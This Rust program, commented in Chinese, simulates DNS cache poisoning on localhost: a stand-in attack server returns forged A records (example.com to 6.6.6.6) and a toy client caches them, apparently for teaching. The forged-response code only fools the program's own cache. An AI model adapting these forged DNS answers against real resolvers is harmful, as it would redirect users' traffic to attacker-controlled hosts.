use byteorder::{BigEndian, WriteBytesExt};
use rand::Rng;
use std::collections::HashMap;
use std::net::UdpSocket;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

// 用于在攻击服务器和客户端之间共享请求ID
struct SharedState {
    request_id: Arc<Mutex<u16>>,
}

#[derive(Debug, Clone)]
struct DnsHeader {
    id: u16,
    flags: u16,
    questions: u16,
    answers: u16,
    authority: u16,
    additional: u16,
}

impl DnsHeader {
    fn new(id: u16) -> DnsHeader {
        DnsHeader {
            id,
            flags: 0x0100,
            questions: 1,
            answers: 0,
            authority: 0,
            additional: 0,
        }
    }

    fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.write_u16::<BigEndian>(self.id).unwrap();
        bytes.write_u16::<BigEndian>(self.flags).unwrap();
        bytes.write_u16::<BigEndian>(self.questions).unwrap();
        bytes.write_u16::<BigEndian>(self.answers).unwrap();
        bytes.write_u16::<BigEndian>(self.authority).unwrap();
        bytes.write_u16::<BigEndian>(self.additional).unwrap();
        bytes
    }
}

#[derive(Clone)]
struct DnsCache {
    cache: Arc<Mutex<HashMap<String, String>>>,
}

impl DnsCache {
    fn new() -> Self {
        DnsCache {
            cache: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn insert(&self, domain: String, ip: String) {
        let mut cache = self.cache.lock().unwrap();
        println!("缓存已更新: {} -> {}", domain, ip);
        cache.insert(domain, ip);
    }

    fn get(&self, domain: &str) -> Option<String> {
        let cache = self.cache.lock().unwrap();
        cache.get(domain).cloned()
    }
}

fn create_query(domain: &str) -> Vec<u8> {
    let mut query = Vec::new();
    for part in domain.split('.') {
        query.push(part.len() as u8);
        query.extend(part.as_bytes());
    }
    query.push(0);
    query.write_u16::<BigEndian>(1).unwrap(); // TYPE A
    query.write_u16::<BigEndian>(1).unwrap(); // CLASS IN
    query
}

struct AttackServer {
    socket: UdpSocket,
    shared_state: Arc<SharedState>,
}

impl AttackServer {
    fn new(bind_addr: &str, shared_state: Arc<SharedState>) -> std::io::Result<Self> {
        Ok(AttackServer {
            socket: UdpSocket::bind(bind_addr)?,
            shared_state,
        })
    }

    fn create_poisoned_response(&self, domain: &str, fake_ip: &str) -> Vec<u8> {
        let mut response = Vec::new();

        // 使用共享的请求ID
        let id = *self.shared_state.request_id.lock().unwrap();

        let header = DnsHeader {
            id,
            flags: 0x8180, // 响应标志
            questions: 1,
            answers: 1,
            authority: 0,
            additional: 0,
        };

        response.extend(header.to_bytes());
        response.extend(create_query(domain));

        // 添加应答部分
        response.push(0xc0); // 压缩指针
        response.push(0x0c); // 偏移量

        response.write_u16::<BigEndian>(1).unwrap(); // TYPE A
        response.write_u16::<BigEndian>(1).unwrap(); // CLASS IN
        response.write_u32::<BigEndian>(300).unwrap(); // TTL
        response.write_u16::<BigEndian>(4).unwrap(); // 数据长度

        // 添加伪造IP
        for octet in fake_ip.split('.') {
            response.push(octet.parse::<u8>().unwrap());
        }

        response
    }

    fn start(&self, target_domain: &str, fake_ip: &str) -> std::io::Result<()> {
        println!("攻击服务器已启动，等待DNS查询...");

        let mut buf = [0; 512];
        while let Ok((_, src)) = self.socket.recv_from(&mut buf) {
            println!("收到DNS查询，发送伪造响应");
            let response = self.create_poisoned_response(target_domain, fake_ip);
            self.socket.send_to(&response, src)?;
        }
        Ok(())
    }
}

struct DnsClient {
    socket: UdpSocket,
    cache: DnsCache,
    shared_state: Arc<SharedState>,
}

impl DnsClient {
    fn new(bind_addr: &str, shared_state: Arc<SharedState>) -> std::io::Result<Self> {
        Ok(DnsClient {
            socket: UdpSocket::bind(bind_addr)?,
            cache: DnsCache::new(),
            shared_state,
        })
    }

    fn query_domain(&self, domain: &str, dns_server: &str) -> std::io::Result<String> {
        if let Some(cached_ip) = self.cache.get(domain) {
            println!("命中缓存: {} -> {}", domain, cached_ip);
            return Ok(cached_ip);
        }

        let id: u16 = rand::thread_rng().gen();
        // 更新共享ID
        *self.shared_state.request_id.lock().unwrap() = id;

        println!("发送DNS查询 - ID: {}", id);

        let header = DnsHeader::new(id);
        let mut packet = header.to_bytes();
        packet.extend(create_query(domain));

        self.socket.send_to(&packet, dns_server)?;

        let mut buf = [0; 512];
        self.socket.set_read_timeout(Some(Duration::from_secs(2)))?;

        match self.socket.recv_from(&mut buf) {
            Ok((size, _)) => {
                // 简化的响应处理：直接提取IP地址
                if size >= 12 {
                    // 确保至少有DNS头部
                    let ip = format!(
                        "{}.{}.{}.{}",
                        buf[size - 4],
                        buf[size - 3],
                        buf[size - 2],
                        buf[size - 1]
                    );
                    println!("解析到IP: {}", ip);
                    self.cache.insert(domain.to_string(), ip.clone());
                    Ok(ip)
                } else {
                    Err(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        "响应格式错误",
                    ))
                }
            }
            Err(e) => Err(e),
        }
    }

    fn force_query_domain(&self, domain: &str, dns_server: &str) -> std::io::Result<String> {
        // 1. 生成新的查询ID
        let id: u16 = rand::thread_rng().gen();
        *self.shared_state.request_id.lock().unwrap() = id;

        // 2. 构建不使用缓存的查询包
        let header = DnsHeader {
            id,
            flags: 0x0000, // 非递归查询标志
            questions: 1,
            answers: 0,
            authority: 0,
            additional: 0,
        };

        let mut packet = header.to_bytes();
        packet.extend(create_query(domain));

        // 3. 发送查询并等待响应
        self.socket.send_to(&packet, dns_server)?;

        let mut buf = [0; 512];
        self.socket.set_read_timeout(Some(Duration::from_secs(2)))?;

        // 4. 处理响应并更新缓存
        match self.socket.recv_from(&mut buf) {
            Ok((size, _)) => {
                if size >= 12 {
                    // 解析响应
                    let ip = self.extract_ip_from_response(&buf[..size])?;

                    // 强制更新缓存
                    self.cache.insert(domain.to_string(), ip.clone());

                    println!("强制刷新成功: {} -> {}", domain, ip);
                    Ok(ip)
                } else {
                    Err(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        "响应格式错误",
                    ))
                }
            }
            Err(e) => Err(e),
        }
    }

    // 辅助方法：从响应中提取IP
    fn extract_ip_from_response(&self, response: &[u8]) -> std::io::Result<String> {
        if response.len() < 12 {
            return Err(std::io::Error::new(std::io::ErrorKind::Other, "响应太短"));
        }

        // 跳过DNS头部和查询部分，直接读取答案部分的IP地址
        let ip = format!(
            "{}.{}.{}.{}",
            response[response.len() - 4],
            response[response.len() - 3],
            response[response.len() - 2],
            response[response.len() - 1]
        );

        Ok(ip)
    }
}
// 添加DNS服务器角色
struct DnsServer {
    socket: UdpSocket,
    records: HashMap<String, String>,
}

impl DnsServer {
    fn new(bind_addr: &str) -> std::io::Result<Self> {
        let mut records = HashMap::new();
        records.insert("example.com".to_string(), "93.184.216.34".to_string()); // example.com的真实IP

        Ok(DnsServer {
            socket: UdpSocket::bind(bind_addr)?,
            records,
        })
    }

    fn start(&self) -> std::io::Result<()> {
        println!("正常DNS服务器已启动");
        let mut buf = [0; 512];

        while let Ok((_, src)) = self.socket.recv_from(&mut buf) {
            if let Some(domain) = self.parse_query(&buf) {
                if let Some(ip) = self.records.get(&domain) {
                    println!("DNS服务器: 收到对 {} 的查询", domain);
                    let response = self.create_response(&buf, &domain, ip);
                    self.socket.send_to(&response, src)?;
                    println!("DNS服务器: 返回真实IP {} -> {}", domain, ip);
                }
            }
        }
        Ok(())
    }

    fn parse_query(&self, buf: &[u8]) -> Option<String> {
        if buf.len() < 12 {
            return None;
        }

        let mut pos = 12;
        let mut domain = String::new();
        let mut first = true;

        while pos < buf.len() {
            let len = buf[pos] as usize;
            if len == 0 {
                break;
            }

            if !first {
                domain.push('.');
            }
            first = false;

            pos += 1;
            if pos + len > buf.len() {
                return None;
            }

            domain.push_str(std::str::from_utf8(&buf[pos..pos + len]).unwrap_or(""));
            pos += len;
        }

        Some(domain)
    }

    fn create_response(&self, request: &[u8], domain: &str, ip: &str) -> Vec<u8> {
        let mut response = Vec::new();

        // 复制请求ID
        response.extend_from_slice(&request[0..2]);

        // 标准响应标志
        response.write_u16::<BigEndian>(0x8180).unwrap();
        response.write_u16::<BigEndian>(1).unwrap(); // 问题数
        response.write_u16::<BigEndian>(1).unwrap(); // 答案数
        response.write_u16::<BigEndian>(0).unwrap(); // 授权数
        response.write_u16::<BigEndian>(0).unwrap(); // 附加数

        // 复制查询部分
        let query_end = 12 + domain.len() + 6;
        response.extend_from_slice(&request[12..query_end]);

        // 添加应答部分
        response.push(0xc0);
        response.push(0x0c);

        response.write_u16::<BigEndian>(1).unwrap(); // TYPE A
        response.write_u16::<BigEndian>(1).unwrap(); // CLASS IN
        response.write_u32::<BigEndian>(300).unwrap(); // TTL
        response.write_u16::<BigEndian>(4).unwrap(); // 数据长度

        // 添加IP地址
        for octet in ip.split('.') {
            response.push(octet.parse::<u8>().unwrap());
        }

        response
    }
}

// 修改主函数以展示完整攻击过程
fn main() -> std::io::Result<()> {
    println!("DNS缓存中毒攻击完整演示");
    println!("========================");

    // 启动正常的DNS服务器
    let dns_server = Arc::new(DnsServer::new("127.0.0.1:53533")?);
    let dns_server_clone = dns_server.clone();

    let _dns_handle = thread::spawn(move || {
        dns_server_clone.start().unwrap();
    });

    // 等待DNS服务器启动
    thread::sleep(Duration::from_secs(1));

    // 创建DNS客户端
    let client = DnsClient::new(
        "127.0.0.1:53536",
        Arc::new(SharedState {
            request_id: Arc::new(Mutex::new(0)),
        }),
    )?;

    println!("\n第一阶段：正常DNS查询");
    println!("----------------------");
    match client.query_domain("example.com", "127.0.0.1:53533") {
        Ok(ip) => println!("正常查询结果: example.com -> {}", ip),
        Err(e) => println!("查询失败: {}", e),
    }

    println!("\n第二阶段：启动攻击服务器");
    println!("------------------------");
    let attack_server = AttackServer::new(
        "127.0.0.1:53535",
        Arc::new(SharedState {
            request_id: Arc::new(Mutex::new(0)),
        }),
    )?;

    let _attack_handle = thread::spawn(move || {
        attack_server.start("example.com", "6.6.6.6").unwrap();
    });

    // 等待攻击服务器启动
    thread::sleep(Duration::from_secs(1));

    println!("\n第三阶段：DNS缓存中毒攻击");
    println!("------------------------");
    // match client.query_domain("example.com", "127.0.0.1:53535") {
    //     Ok(ip) => println!("被污染的查询结果: example.com -> {}", ip),
    //     Err(e) => println!("查询失败: {}", e),
    // }
    match client.force_query_domain("example.com", "127.0.0.1:53535") {
        Ok(ip) => println!("被污染的查询结果: example.com -> {}", ip),
        Err(e) => println!("查询失败: {}", e),
    }

    println!("\n第四阶段：验证缓存污染");
    println!("----------------------");
    match client.cache.get("example.com") {
        Some(ip) => println!("当前缓存中的记录: example.com -> {}", ip),
        None => println!("缓存中没有记录"),
    }

    // 再次查询，应该直接使用缓存
    println!("\n第五阶段：使用污染的缓存");
    println!("------------------------");
    match client.query_domain("example.com", "127.0.0.1:53533") {
        Ok(ip) => println!("使用缓存的查询结果: example.com -> {}", ip),
        Err(e) => println!("查询失败: {}", e),
    }

    Ok(())
}
